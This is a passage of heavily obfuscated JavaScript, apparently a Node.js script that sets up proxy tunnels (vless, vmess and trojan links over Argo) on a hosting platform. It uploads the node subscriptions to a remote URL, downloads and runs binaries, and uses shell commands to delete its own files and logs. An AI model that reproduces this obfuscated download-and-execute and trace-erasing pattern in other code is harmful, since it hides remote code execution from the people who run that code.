axios[_0x15f960(_0x54c424._0xcbb471)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x2f9cf8[_0x15f960(_0x54c424._0x244acd)]&&_0x2f9cf8[_0x15f960(0x17d)][_0x15f960(_0x54c424._0x4a5da2)]===_0x15f960(_0x54c424._0x3afb1c)&&_0x2f9cf8[_0x15f960(0x17d)][_0x15f960(0x168)]&&_0x2f9cf8[_0x15f960(_0x54c424._0x244acd)][_0x15f960(_0x54c424._0x2ffed3)])return _0x2f9cf8[_0x15f960(0x17d)][_0x15f960(0x168)]+'_'+_0x2f9cf8[_0x15f960(_0x54c424._0x5a8d1a)][_0x15f960(_0x54c424._0x3e89c3)];}catch(_0xc72873){}}return _0x15f960(0x11d);}async function _0x370dbc(_0x46851e){const _0x834753={_0x8ebc41:0x178,_0x40f025:0x11b,_0x2f1c1d:0x181,_0xd4b8a9:0x169,_0x49ad34:0x135,_0x4bb3d6:0x118,_0x59739a:0x106,_0x561fae:0x118,_0xc31d96:0x104,_0x31ad8a:0x14a},_0x1899d9=await _0x2b5c7e(),_0x1ffbe2=NAME?NAME+'-'+_0x1899d9:_0x1899d9;return new Promise(_0x468dd4=>{setTimeout(()=>{const _0x804170={_0x381156:0x104,_0x2180da:0x106},_0x143dc8=_0x494a,_0x353438={'v':'2','ps':''+_0x1ffbe2,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x143dc8(0x178),'net':'ws','type':_0x143dc8(_0x834753._0x8ebc41),'host':_0x46851e,'path':'/vmess-argo?ed=2560','tls':_0x143dc8(_0x834753._0x40f025),'sni':_0x46851e,'alpn':'','fp':'firefox'},_0x13dfdc='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x143dc8(_0x834753._0x2f1c1d)+_0x46851e+'&fp=firefox&type=ws&host='+_0x46851e+_0x143dc8(_0x834753._0xd4b8a9)+_0x1ffbe2+_0x143dc8(_0x834753._0x49ad34)+Buffer[_0x143dc8(_0x834753._0x4bb3d6)](JSON['stringify'](_0x353438))[_0x143dc8(0x104)](_0x143dc8(_0x834753._0x59739a))+_0x143dc8(0x185)+UUID+'@'+CFIP+':'+CFPORT+_0x143dc8(0x17b)+_0x46851e+_0x143dc8(0x1aa)+_0x46851e+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x1ffbe2+_0x143dc8(0x1a1);console[_0x143dc8(0x195)](Buffer[_0x143dc8(_0x834753._0x561fae)](_0x13dfdc)['toString'](_0x143dc8(0x106))),fs[_0x143dc8(0x154)](subPath,Buffer[_0x143dc8(_0x834753._0x4bb3d6)](_0x13dfdc)[_0x143dc8(_0x834753._0xc31d96)]('base64')),console[_0x143dc8(0x195)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x143dc8(_0x834753._0x31ad8a)]('/'+SUB_PATH,(_0x3ae04b,_0x32a5ec)=>{const _0x2dfde0=_0x143dc8,_0x49100c=Buffer[_0x2dfde0(0x118)](_0x13dfdc)[_0x2dfde0(_0x804170._0x381156)](_0x2dfde0(_0x804170._0x2180da));_0x32a5ec[_0x2dfde0(0x11c)]('Content-Type','text/plain;\x20charset=utf-8'),_0x32a5ec[_0x2dfde0(0x1af)](_0x49100c);}),_0x468dd4(_0x13dfdc);},0x7d0);});}}async function uploadNodes(){const _0x30142f={_0x2865cb:0x16b,_0x1dc534:0x163,_0x53f52b:0x1a0,_0x1da8e2:0x144,_0x59f946:0x194,_0x4d2ebe:0x1a5,_0x4e8980:0x196},_0x1f3742=_0x4d616c;if(UPLOAD_URL&&PROJECT_URL){const _0xbd944=PROJECT_URL+'/'+SUB_PATH,_0x4f1999={'subscription':[_0xbd944]};try{const _0x2978f3=await axios[_0x1f3742(_0x30142f._0x2865cb)](UPLOAD_URL+_0x1f3742(0x171),_0x4f1999,{'headers':{'Content-Type':_0x1f3742(0x194)}});return _0x2978f3&&_0x2978f3['status']===0xc8?(console['log'](_0x1f3742(0x164)),_0x2978f3):null;}catch(_0x6c75fa){if(_0x6c75fa[_0x1f3742(_0x30142f._0x1dc534)]){if(_0x6c75fa[_0x1f3742(0x163)][_0x1f3742(0x1a5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1f3742(0x120)](listPath))return;const _0x11278b=fs['readFileSync'](listPath,_0x1f3742(_0x30142f._0x53f52b)),_0x473c16=_0x11278b[_0x1f3742(0x1b8)]('\x0a')[_0x1f3742(0x192)](_0x26e4a9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1f3742(0x115)](_0x26e4a9));if(_0x473c16[_0x1f3742(_0x30142f._0x1da8e2)]===0x0)return;const _0x100f5d=JSON[_0x1f3742(0x1b2)]({'nodes':_0x473c16});try{const _0x42ba3a=await axios['post'](UPLOAD_URL+_0x1f3742(0x166),_0x100f5d,{'headers':{'Content-Type':_0x1f3742(_0x30142f._0x59f946)}});return _0x42ba3a&&_0x42ba3a[_0x1f3742(_0x30142f._0x4d2ebe)]===0xc8?(console[_0x1f3742(0x195)](_0x1f3742(_0x30142f._0x4e8980)),_0x42ba3a):null;}catch(_0x1efe60){return null;}}else return;}}function cleanFiles(){const _0x5de27b={_0x341838:0x197,_0x383771:0x121,_0x5c2866:0x1b5},_0x77f4fc={_0x43dbe9:0x13e},_0x543bf1={_0x2ad6cf:0x113};setTimeout(()=>{const _0x3e9c94=_0x494a,_0xf9b0a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xf9b0a[_0x3e9c94(0x1ac)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xf9b0a[_0x3e9c94(0x1ac)](phpPath);process[_0x3e9c94(_0x5de27b._0x341838)]===_0x3e9c94(0x10b)?exec(_0x3e9c94(0x180)+_0xf9b0a['join']('\x20')+_0x3e9c94(_0x5de27b._0x383771),_0xbb6188=>{const _0x444453=_0x3e9c94;console[_0x444453(_0x543bf1._0x2ad6cf)](),console['log'](_0x444453(0x13e)),console[_0x444453(0x195)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x3e9c94(0x13a)+_0xf9b0a[_0x3e9c94(_0x5de27b._0x5c2866)]('\x20')+_0x3e9c94(0x19a),_0x1198ff=>{const _0x22bfed=_0x3e9c94;console['clear'](),console['log'](_0x22bfed(_0x77f4fc._0x43dbe9)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4a9929={_0x24c7fc:0x194,_0x198b9d:0x193,_0x593efa:0x15a},_0x4d4253=_0x4d616c;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4d4253(0x146));return;}try{const _0x30fc07=await axios[_0x4d4253(0x16b)](_0x4d4253(0x105),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4d4253(_0x4a9929._0x24c7fc)}});return console[_0x4d4253(0x195)](_0x4d4253(_0x4a9929._0x198b9d)),_0x30fc07;}catch(_0x32ba3c){return console[_0x4d4253(0x10c)](_0x4d4253(0x18e)+_0x32ba3c[_0x4d4253(_0x4a9929._0x593efa)]),null;}}async function startserver(){const _0x4806a0=_0x4d616c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3ad7e4){console[_0x4806a0(0x10c)]('Error\x20in\x20startserver:',_0x3ad7e4);}}startserver()[_0x4d616c(0x1be)](_0x3000c8=>{const _0x4a68fe=_0x4d616c;console[_0x4a68fe(0x10c)](_0x4a68fe(0x1c0),_0x3000c8);}),app[_0x4d616c(0x17f)](PORT,()=>console[_0x4d616c(0x195)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
